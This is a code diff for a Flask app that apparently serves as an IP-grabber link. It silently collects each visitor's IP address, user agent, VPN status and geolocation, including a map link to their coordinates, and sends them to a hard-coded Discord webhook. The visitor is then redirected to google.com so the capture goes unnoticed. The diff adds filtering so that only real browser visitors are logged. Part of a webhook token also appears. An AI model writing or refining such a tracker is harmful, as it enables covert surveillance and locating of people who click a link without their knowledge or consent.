@@ -10,6 +10,7 @@ DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1427010775163080868/6Uaf
 
 def get_visitor_info(ip, user_agent):
     try:
+        # Get geolocation data
         ipapi_url = f"https://ipapi.co/{ip}/json/"
         geoip_url = f"https://json.geoiplookup.io/{ip}"
 
@@ -18,7 +19,7 @@ def get_visitor_info(ip, user_agent):
 
         vpn = "Yes" if vpnconn.get("connection_type") == "Corporate" else "No"
 
-        info = {
+        return {
             "ip": ip,
             "user_agent": user_agent,
             "vpn": vpn,
@@ -32,25 +33,14 @@ def get_visitor_info(ip, user_agent):
             "date": datetime.datetime.utcnow().strftime("%d/%m/%Y"),
             "time": datetime.datetime.utcnow().strftime("%H:%M:%S"),
         }
-        return info
     except Exception as e:
-        print("Error getting IP info:", e)
-        return {
-            "ip": ip,
-            "user_agent": user_agent,
-            "vpn": "Unknown",
-            "country": "Unknown",
-            "countryCode": "xx",
-            "region": "",
-            "city": "",
-            "zip": "",
-            "lat": 0,
-            "lon": 0,
-            "date": datetime.datetime.utcnow().strftime("%d/%m/%Y"),
-            "time": datetime.datetime.utcnow().strftime("%H:%M:%S"),
-        }
+        print("Failed to fetch visitor info:", e)
+        return None
 
 def send_to_discord(info):
+    if not info:
+        return
+
     try:
         flag_url = f"https://countryflagsapi.com/png/{info['countryCode']}"
         ip_city = f"{info['ip']} ({info['city'] if info['city'] else 'Unknown City'})"
@@ -59,12 +49,12 @@ def send_to_discord(info):
             "username": ip_city,
             "avatar_url": flag_url,
             "embeds": [{
-                "title": f"Visitor From {info['country']}",
+                "title": f"🌍 New Visitor from {info['country']}",
                 "color": 39423,
                 "fields": [
                     {"name": "IP & City", "value": ip_city, "inline": True},
                     {"name": "VPN?", "value": info["vpn"], "inline": True},
-                    {"name": "User Agent", "value": info["user_agent"]},
+                    {"name": "User Agent", "value": info["user_agent"][:256]},
                     {"name": "Country / Code", "value": f"{info['country']} / {info['countryCode'].upper()}", "inline": True},
                     {"name": "Region | City | Zip", "value": f"[{info['region']} | {info['city']} | {info['zip']}](https://www.google.com/maps/search/?api=1&query={info['lat']},{info['lon']})", "inline": True},
                 ],
@@ -82,14 +72,24 @@ def send_to_discord(info):
 
 @app.route('/')
 def index():
-    # ✅ Use correct IP parsing with proxy awareness
+    # ✅ Get real IP (Render passes multiple IPs via X-Forwarded-For)
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     if ip and ',' in ip:
         ip = ip.split(',')[0].strip()
 
-    user_agent = request.headers.get('User-Agent', 'Unknown')
+    # ✅ Get user agent and lowercase it for filtering
+    user_agent = request.headers.get('User-Agent', 'Unknown').lower()
+
+    # ✅ Ignore bots, Render checks, and non-browser requests
+    if any(bot in user_agent for bot in ["render", "bot", "health", "monitor", "uptime", "curl", "python", "unknown"]):
+        print("Ignored bot or health check request.")
+        return "Ignored", 200
+
+    # ✅ Fetch and send visitor info
     info = get_visitor_info(ip, user_agent)
-    send_to_discord(info)
+    if info and info['ip'] and info['country'] != "Unknown":
+        send_to_discord(info)
+
     return redirect("https://www.google.com")
 
 if __name__ == "__main__":
